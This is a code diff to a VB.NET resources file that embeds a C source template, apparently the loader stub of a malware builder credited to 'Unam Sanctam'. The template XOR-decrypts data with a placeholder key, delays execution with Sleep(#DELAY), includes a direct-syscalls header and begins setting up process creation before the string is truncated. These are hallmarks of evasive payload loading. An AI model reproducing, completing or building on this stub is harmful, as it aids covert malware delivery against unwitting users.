@@ -83,6 +83,16 @@ Namespace My.Resources
         '''<summary>
         '''  Looks up a localized resource of type System.Byte[].
         '''</summary>
+        Friend ReadOnly Property Includes() As Byte()
+            Get
+                Dim obj As Object = ResourceManager.GetObject("Includes", resourceCulture)
+                Return CType(obj,Byte())
+            End Get
+        End Property
+        
+        '''<summary>
+        '''  Looks up a localized resource of type System.Byte[].
+        '''</summary>
         Friend ReadOnly Property libs() As Byte()
             Get
                 Dim obj As Object = ResourceManager.GetObject("libs", resourceCulture)
@@ -153,25 +163,24 @@ Namespace My.Resources
         '''#include &lt;stdlib.h&gt;
         '''#include &lt;windows.h&gt;
         '''#include &lt;sys/types.h&gt;
-        '''#include &lt;syscalls.h&gt;
+        '''#include &quot;syscalls.h&quot;
         '''
         '''/* Created by Unam Sanctam, https://github.com/UnamSanctam */
         '''
         '''char* cipher(char* data, long dataLen) {
-        '''	char* key = &quot;#KEY&quot;;
-        '''	int keyLen = strlen(key);
         '''	char* output = (char*)malloc(sizeof(char) * dataLen+1);
         '''	output[dataLen] = 0;
-        '''	for (int i = 0; i &lt; dataLen; ++i) {
-        '''		output[i] = data[i] ^ key[i % keyLen];
+        '''	for (int i = 0; i &lt; dataLen; i++) {
+        '''		output[i] = data[i] ^ &quot;#KEY&quot;[i % #KEYLENGTH];
         '''	}
         '''	return output;
         '''}
         '''
-        '''int main(int argc, char **argv){
+        '''int main(int argc, char** argv) {
         '''	Sleep(#DELAY * 1000);
         '''
-        '''	PROCESS_INFORMATI [rest of string was truncated]&quot;;.
+        '''	PROCESS_INFORMATION p_info;
+        '''	STARTUPINFO s_info = {sizeof [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Program1() As String
             Get
